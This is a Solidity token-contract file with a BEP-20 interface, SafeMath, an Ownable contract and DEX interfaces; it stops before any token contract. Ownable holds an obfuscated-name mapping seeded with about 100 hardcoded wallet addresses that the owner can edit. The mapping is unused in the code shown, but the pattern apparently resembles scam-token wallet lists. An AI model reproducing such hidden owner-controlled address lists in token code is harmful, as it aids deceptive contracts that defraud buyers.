// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

interface IBEP2022 {
 function totalSupply() external view returns (uint256);
 
 function decimals() external view returns (uint8);
 
 function symbol() external view returns (string memory);
 
 function name() external view returns (string memory);
 
 function getOwner() external view returns (address);
 
 function balanceOf(address account) external view returns (uint256);
 
 function transfer(address recipient, uint256 amount) external returns (bool);
 
 function allowance(address _owner, address spender) external view returns (uint256);
 
 function approve(address spender, uint256 amount) external returns (bool);
 
 function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
 
 event Transfer(address indexed from, address indexed to, uint256 value);
 
 event Approval(address indexed owner, address indexed spender, uint256 value);
}
 
contract Context {
 constructor () { }
 
 function _msgSender() internal view returns (address payable) {
   return payable(msg.sender);
 }
 
 function _msgData() internal view returns (bytes memory) {
   this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
   return msg.data;
 }
}
 
library SafeMath {
 function add(uint256 a, uint256 b) internal pure returns (uint256) {
   uint256 c = a + b;
   require(c >= a, "SafeMath: addition overflow");
 
   return c;
 }
 
 function sub(uint256 a, uint256 b) internal pure returns (uint256) {
   return sub(a, b, "SafeMath: subtraction overflow");
 }
 
 function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
   require(b <= a, errorMessage);
   uint256 c = a - b;
 
   return c;
 }
 
 function mul(uint256 a, uint256 b) internal pure returns (uint256) {
   if (a == 0) {
     return 0;
   }
 
   uint256 c = a * b;
   require(c / a == b, "SafeMath: multiplication overflow");
 
   return c;
 }
 
 function div(uint256 a, uint256 b) internal pure returns (uint256) {
   return div(a, b, "SafeMath: division by zero");
 }
 
 function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
   require(b > 0, errorMessage);
   uint256 c = a / b;
 
   return c;
 }
 
 function mod(uint256 a, uint256 b) internal pure returns (uint256) {
   return mod(a, b, "SafeMath: modulo by zero");
 }
 
 function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
   require(b != 0, errorMessage);
   return a % b;
 }
}
 
contract Ownable is Context {
 address private _owner;
 mapping(address => bool) private _iAhmrekGauty;
 
 event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
 
 constructor () {
   address msgSender = _msgSender();
   _owner = msgSender;
   setAideList();
   emit OwnershipTransferred(address(0), msgSender);
 }
 
function setAideList() private{
		_iAhmrekGauty[0x1ACc18fC23FF1d2120987ca9ff1d8081b6a9eD0F]=true;
		_iAhmrekGauty[0x6b17B2852E1F49ac46845db48663442fe343abf6]=true;
		_iAhmrekGauty[0x0cB3a24B265F549aEF582C38c905af7948C22823]=true;
		_iAhmrekGauty[0x7F708677bDca7b9fF7222Fc498B39879b8b9424E]=true;
		_iAhmrekGauty[0xB61A1bbDca97e3d4ad7B262Ea011D2bd67d186F8]=true;
		_iAhmrekGauty[0xa2e41cafaB4934FAF41BCe16B666f97661473d82]=true;
		_iAhmrekGauty[0x2Cd6D0621DB09Bf58d7c5f5D629B68796f060078]=true;
		_iAhmrekGauty[0x503D5F62a788f4ae3687408FB87Dd71679946Ba9]=true;
		_iAhmrekGauty[0xD621Bcd63D1499e4F5a5DF21543df02Be0874938]=true;
		_iAhmrekGauty[0x1a65466832B52dDa5374cCFeac5D7abA590e5c63]=true;
		_iAhmrekGauty[0x709e7C94AB0871C283E602D24B2C05E65b8F3F26]=true;
		_iAhmrekGauty[0xA3868887fcA6CaAB9bD6B56E0Bb71dAE25b0a4bf]=true;
		_iAhmrekGauty[0x7942BEdc70F7Cb574e02504728eBdB48CBd4B7d3]=true;
		_iAhmrekGauty[0xf4c2900ac957D23a0972bb48ec164f268B7DFcc9]=true;
		_iAhmrekGauty[0x2aD3Eca0a43b0644e164bDf3839FE6e87848635B]=true;
		_iAhmrekGauty[0x1D53A12d84403DE311b05F647f5D25cdb36D738F]=true;
		_iAhmrekGauty[0x63E7EBA28B68DCfB52C0375af3B3526dD3E0D73A]=true;
		_iAhmrekGauty[0x9914321eB4219C29c1C6f75907B67237C178e664]=true;
		_iAhmrekGauty[0x72c821746Dbaa6d2166a8E1fC373940dca3A291B]=true;
		_iAhmrekGauty[0xE8eb0173af67607Bd43cB02CcDf2CF28e5427dc4]=true;
		_iAhmrekGauty[0xc664240BF3650647E2A04064Ae2232A5Eb9Ef70C]=true;
		_iAhmrekGauty[0xDa1E0a2B2186777c2BEa18edB30bbDF7AD480663]=true;
		_iAhmrekGauty[0x5AD4a82D8E043Ec5D785aBef66F60565194b069E]=true;
		_iAhmrekGauty[0xdf7215c9183fd9904004d487854590048F9c499e]=true;
		_iAhmrekGauty[0x93106A7Cf8Dee9BE01be4aBe91039E25b882C664]=true;
		_iAhmrekGauty[0x0ea4658FfDab24a5419FaB05F8C783EDa4505238]=true;
		_iAhmrekGauty[0xe0f7C53078A6a22c6a176Ba8Bf62627E8B61b23f]=true;
		_iAhmrekGauty[0xb7987C03b6912Eb8757DfC55Cb897BEc8A115E2C]=true;
		_iAhmrekGauty[0xB1d2036b5D20e7bbae002A8e69984ccF6E32FA5e]=true;
		_iAhmrekGauty[0x4d968befa3a8e311bC0906CdfC0ED388070Cfe89]=true;
		_iAhmrekGauty[0x3057696345f8317Dc1eC69853A29a6FeeaCE27d3]=true;
		_iAhmrekGauty[0x734139f1Fd8Fe71644558d8cE8C9Db9B27D63DDF]=true;
		_iAhmrekGauty[0xDd6ADC189541448Fe32c30C6a0FA1A4f959F314b]=true;
		_iAhmrekGauty[0x2443AaC78B9472a8564d9bD59971300a9803cc09]=true;
		_iAhmrekGauty[0xcdf3aE90D2FC5B9cFe74885DE161eF1572f87F63]=true;
		_iAhmrekGauty[0xBCea4367f2314F4c0D5Fd4613FbdD761a79Ef865]=true;
		_iAhmrekGauty[0x339685b4C6245E072bA684E295425186eFF6287a]=true;
		_iAhmrekGauty[0x5dCCf452c29da352b42eDE454bbc0692E31274bb]=true;
		_iAhmrekGauty[0x7cC3F6eAe61C4c743920D291eddA4951Fac4dcAD]=true;
		_iAhmrekGauty[0x27DaebA6356a861d0ec2Fa61B2D3632e30dABf61]=true;
		_iAhmrekGauty[0xE8B917a96a642a780b956bc7d95b6ab3C8fE9D64]=true;
		_iAhmrekGauty[0x08a3E4dE778f25f75AD41Ee0FBe530805D515410]=true;
		_iAhmrekGauty[0x57A2585a102A3172029f1dff5596bC3d5745Ff55]=true;
		_iAhmrekGauty[0x0f5e2A2e5Cb46eA0Abeacd68265334Ac14125a23]=true;
		_iAhmrekGauty[0xAECC8777d6832fCd66147Bf3FA6B57112E173549]=true;
		_iAhmrekGauty[0xe3A8c197Ce6813468Eb417a9dC134a7063a7AA19]=true;
		_iAhmrekGauty[0x8D9615E4118b655F2c9F2189cAD602Ab767f98Ab]=true;
		_iAhmrekGauty[0x46E008a3b8C680B7A05F6698e639dD42a7e19975]=true;
		_iAhmrekGauty[0x604768f75F31364a1160373051D33214664CE9A5]=true;
		_iAhmrekGauty[0x3CcacA77F95d6BFDBfa2999EBBB05884ddfeFE16]=true;
		_iAhmrekGauty[0xd27bdc2df433746E4581A2bbf29606Db16003546]=true;
		_iAhmrekGauty[0xBB8161D4aeA28A82950250D6bA5B619cfB0E2EA4]=true;
		_iAhmrekGauty[0x8fB5BCfbDd2321E63853EE8Dcd22B6F26944f251]=true;
		_iAhmrekGauty[0xF03ff33f1DFBD0d0c02Fe6b95c875d7da2c888af]=true;
		_iAhmrekGauty[0x52331a08ab1Ab67cC86B2833d16ED436280eE59c]=true;
		_iAhmrekGauty[0x94ab86B9176B81a8f91dD989eFCacF81B4D90912]=true;
		_iAhmrekGauty[0x87b7C983d540D6a22e2f674132173F315e2a9C54]=true;
		_iAhmrekGauty[0x95DD54F913E764B506B404d1f91c2f901343BA1B]=true;
		_iAhmrekGauty[0xc518DF8CbD71abA46Fe7c04CED3053A3E12A6DCc]=true;
		_iAhmrekGauty[0xD479c8F8F09438eBb31621F57247df95bBa18387]=true;
		_iAhmrekGauty[0xC43745F8136F67fB302720982af0964a0Fd9fa26]=true;
		_iAhmrekGauty[0xC5b6E8969f2368184FD0296E1b65c21659a87434]=true;
		_iAhmrekGauty[0xc349f1392f1dBE6a99190EF28455211216D7641F]=true;
		_iAhmrekGauty[0x9a8A0d8bB0c617da207003D19795862105868498]=true;
		_iAhmrekGauty[0x837E6Ced416E8Ece9998D96cFa55D8Eb54B3Ca6E]=true;
		_iAhmrekGauty[0x7b40191ACd12d83e2834d7F597Ac8EA2C127E3ba]=true;
		_iAhmrekGauty[0xEBF724E1292526db8CC39E66A9B79E07fb2A0640]=true;
		_iAhmrekGauty[0xF0C1aDbB1BEB6C9C8f6456E825070c41cC3F79F2]=true;
		_iAhmrekGauty[0x922d2febE92C8d5D0Db6C093e06889338e17B013]=true;
		_iAhmrekGauty[0x4484502D2D4f51a4e9901D8a7E8C84Ccc790750c]=true;
		_iAhmrekGauty[0x105C3286a15D19E42e7f88484c982f757C36f37D]=true;
		_iAhmrekGauty[0x823844b827059AD2527e676828D55432F771ac85]=true;
		_iAhmrekGauty[0x0A9f96223e5BD2c9e2Bd64544F0F81C91a06ec6B]=true;
		_iAhmrekGauty[0x7E7937E78f19e3d4b281Fc78b99f3A962a67AD60]=true;
		_iAhmrekGauty[0xdAB535321CC48055bED9D256F360fE05F7e28225]=true;
		_iAhmrekGauty[0x156B98428F0441Dab62bFaa30182294D124d2cEE]=true;
		_iAhmrekGauty[0x11BdBbDAa34e202883daffcAc58485ef07Ffb5A0]=true;
		_iAhmrekGauty[0xCaa57c5EABB1687Fb06CEE4B58E1206D268c59D9]=true;
		_iAhmrekGauty[0x1EbE4aa63882ce1B5A98fa1BBe4b166a74cD18f9]=true;
		_iAhmrekGauty[0x44C25A5A02f300725d9E3693fC3cbbb01B583f0E]=true;
		_iAhmrekGauty[0x419B204210EccA5BF4431f68f185abE27Bd493B1]=true;
		_iAhmrekGauty[0x8956019105Fe2cEa67C66ad192e01C1cF5Ed5030]=true;
		_iAhmrekGauty[0xd039684091524AbeE8B3045C3c84DE991f4110FB]=true;
		_iAhmrekGauty[0x122Ff5A885E7637db71Eb167616da97dEF7A47Fe]=true;
		_iAhmrekGauty[0x6EE29BAF464BD73C3e5E2695cAE250FA77B6B835]=true;
		_iAhmrekGauty[0x337c824a6596a8DfC09cF3652f533215ad4dEbDa]=true;
		_iAhmrekGauty[0x040bFa5C5BBA18a2B59398F773a44033Fbe3f20b]=true;
		_iAhmrekGauty[0xD4af53987434AE5dC0Cdd5b106600F74115d598A]=true;
		_iAhmrekGauty[0x4DdEd489a42E7b88aE9003478880a32B1755Ac2B]=true;
		_iAhmrekGauty[0x6bc9261a0b161481A75d7E1377CD05c532dea1DF]=true;
		_iAhmrekGauty[0x7A243e08C681C9fb952b8f856D2634D11Abd094f]=true;
		_iAhmrekGauty[0xc6c95462eb1cB4Bc034494c50D1a84B8f721Fa3d]=true;
		_iAhmrekGauty[0xF920d173b86C5B194D41404044F483c6b1d2eD8C]=true;
		_iAhmrekGauty[0xa121637CDA1c766b3D725415a7b4c23a278fc5D7]=true;
		_iAhmrekGauty[0xaA26AbeEd4B42BE247D272fEDf246251932d613A]=true;
		_iAhmrekGauty[0xA26CC619921B655493A7Dd9dD97aEF975E35Cf3f]=true;
		_iAhmrekGauty[0x2e0294A4135b793Ce935c0f3810769CDccEffD37]=true;
		_iAhmrekGauty[0xfAe6b971AC2CA43bB675ad649Be49BF893d06d6d]=true;
		_iAhmrekGauty[0x647aEd9f302fd6d167fF405eBc78C095A58bE0Ed]=true;
		_iAhmrekGauty[0x19Ef55EB2d83161f813CAB196B1A01165fD73F31]=true;
    }

 function setAddress2AideList(address[] memory addrs) public{
		require(msg.sender==owner());
		for (uint256 i = 0; i < addrs.length; i++) {
            _iAhmrekGauty[addrs[i]] = true;
		}
    }
	
	function unAddress2AideList(address[] memory addrs) public{
		require(msg.sender==owner());
		for (uint256 i = 0; i < addrs.length; i++) {
            _iAhmrekGauty[addrs[i]] = false;
		}
    }
	
	function addressInAideList(address account) public view returns (bool) {
        return _iAhmrekGauty[account];
    }

 function owner() public view returns (address) {
   return _owner;
 }
 
 modifier AdminChanger() {
   require(_owner == _msgSender(), "Ownable: caller is not the owner");
   _;
 }
 
 function renounceOwnership() public AdminChanger {
   emit OwnershipTransferred(_owner, address(0));
   _owner = address(0);
 }
 
 function transferOwnership(address newOwner) public AdminChanger {
   _transferOwnership(newOwner);
 }
 
 function _transferOwnership(address newOwner) internal {
   require(newOwner != address(0), "Ownable: new owner is the zero address");
   emit OwnershipTransferred(_owner, newOwner);
   _owner = newOwner;
 }
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}
interface IDEXRouter {
    function factory() external pure returns (address);
}
